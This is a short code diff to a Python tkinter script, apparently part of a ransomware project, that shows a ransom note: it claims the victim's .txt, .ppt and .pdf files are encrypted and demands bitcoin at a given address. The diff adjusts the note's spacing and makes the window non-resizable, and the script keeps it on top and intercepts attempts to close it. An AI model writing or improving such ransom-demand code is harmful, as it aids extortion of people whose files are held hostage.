@@ -1,7 +1,7 @@
 from tkinter import *
 import tkinter as tk
 
-ransom_note = """All of your .txt, .ppt, .pdf files have been encrypted!!
+ransom_note = """           All of your .txt, .ppt, .pdf files have been encrypted!
                  Please send money to the bitcoin address 
                  
                  34xp4vRoCGJym3xR7yCVPFHoCNxv4Twseo 
@@ -13,6 +13,7 @@ class PopUp(tk.Tk):
         tk.Tk.__init__(self)
         self.title("Ransom Note")
         self.geometry("800x250")
+        self.resizable(0,0)
         self.set_topmost_window()
         self.protocol("WM_DELETE_WINDOW", self.exit_attempt)
         window_note = Label(self, text = ransom_note, fg='red', font=("Helvetica", 16))
